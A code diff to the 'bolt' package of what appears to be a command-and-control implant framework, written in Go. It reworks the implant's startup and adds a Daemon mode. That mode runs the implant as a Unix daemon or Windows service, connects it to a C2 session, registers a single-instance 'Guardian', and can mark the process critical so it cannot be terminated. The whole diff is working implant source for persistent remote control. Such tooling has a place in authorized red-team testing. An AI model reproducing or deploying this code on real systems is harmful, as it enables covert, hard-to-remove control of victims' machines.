@@ -14,6 +14,7 @@
 // along with this program.  If not, see <https://www.gnu.org/licenses/>.
 //
 
+// Package bolt contains the functions for launching a Bolt instance.
 package bolt
 
 import (
@@ -31,6 +32,7 @@ import (
 )
 
 // Start attempts to create a Bolt instance with the supplied arguments.
+//
 // This function will block and will NOT return (it calls 'device.GoExit').
 //
 // Arguments:
@@ -67,16 +69,16 @@ func Start(ignore, load, critical bool, l man.Linker, guard, pipe string, c cfg.
 		}
 	}
 	if s == nil {
-		if len(guard) > 0 {
-			if man.Check(l, guard) && !ignore {
-				f()
-				return
-			}
-			man.GuardContext(x, l, guard)
+		if len(guard) > 0 && man.Check(l, guard) && !ignore {
+			f()
+			return
 		}
 		if s, _ = c2.ConnectContext(x, nil, p); s == nil {
 			f()
 			return
+		}
+		if len(guard) > 0 {
+			man.GuardContext(x, l, guard)
 		}
 	}
 	limits.Ignore()
@@ -101,4 +103,85 @@ func Start(ignore, load, critical bool, l man.Linker, guard, pipe string, c cfg.
 	close(w)
 	f()
 	device.GoExit()
+}
+
+// Daemon attempts to create a Bolt instance with the supplied arguments as a *nix
+// daemon or a Windows service. This function will until it receives a SIGINT or
+// SIGTERM to shutdown safely. (or a ServiceStop message in the case of Windows)
+//
+// This function will block and will NOT return (it calls 'device.GoExit').
+//
+// Arguments:
+//   name     - The service name when running under Windows. This may empty as it
+//               is ignored under *nix.
+//   ignore   - If True, this will ignore any currently existing Guardians with
+//               the same guard name.
+//   load     - If True, this Bolt will look to see if it's being launched as a
+//               Spawn/Migrate callable. This will use the supplied 'pipe' argument
+//               to look for (This is the 'pipe' argument passed to spawn/migrate).
+//   critical - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
+//               (Windows only obviously). And will make itself un-terminatable
+//               while running.
+//   l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
+//   guard    - String name for the Guardian to look for/create. DO NOT FORMAT
+//               THIS NAME, it will be formatted based on the Linker type.
+//   pipe     - Pipe name used for Bolt's started via Spawn/Migrate. Use this as
+//               a non-formatted name to be passed to any Spawn/Migrate commands.
+//   c        - Packed Config. The resulting profile will be build when the function
+//               starts and will silently return if it fails.
+func Daemon(name string, ignore, load, critical bool, l man.Linker, guard, pipe string, c cfg.Config) {
+	p, err := c.Build()
+	if err != nil {
+		return
+	}
+	device.Daemon(name, func(x context.Context) error {
+		return daemonFunc(x, ignore, load, critical, l, guard, pipe, p)
+	})
+	device.GoExit()
+}
+func daemonFunc(x context.Context, ignore, load, critical bool, l man.Linker, guard, pipe string, p c2.Profile) error {
+	var s *c2.Session
+	if load {
+		if s, _ = c2.LoadContext(x, nil, pipe, time.Millisecond*500); s != nil && len(guard) > 0 {
+			go func() {
+				time.Sleep(time.Second * time.Duration(2+uint64(util.FastRandN(3))))
+				man.GuardContext(x, l, guard)
+			}()
+		}
+	}
+	if s == nil {
+		if len(guard) > 0 && man.Check(l, guard) && !ignore {
+			return nil
+		}
+		if s, _ = c2.ConnectContext(x, nil, p); s == nil {
+			return nil
+		}
+		if len(guard) > 0 {
+			man.GuardContext(x, l, guard)
+		}
+	}
+	var (
+		y, f = context.WithCancel(x)
+		w    = make(chan os.Signal, 1)
+		z    bool
+	)
+	limits.Ignore()
+	limits.MemorySweep(y)
+	if limits.Notify(w, syscall.SIGINT, syscall.SIGTERM); critical {
+		z, _ = device.SetCritical(true)
+	}
+	select {
+	case <-w:
+	case <-x.Done():
+	case <-y.Done():
+	case <-s.Done():
+	}
+	if s.Close(); critical && !z {
+		device.SetCritical(false)
+	}
+	limits.Reset()
+	limits.StopNotify(w)
+	close(w)
+	f()
+	return nil
 }
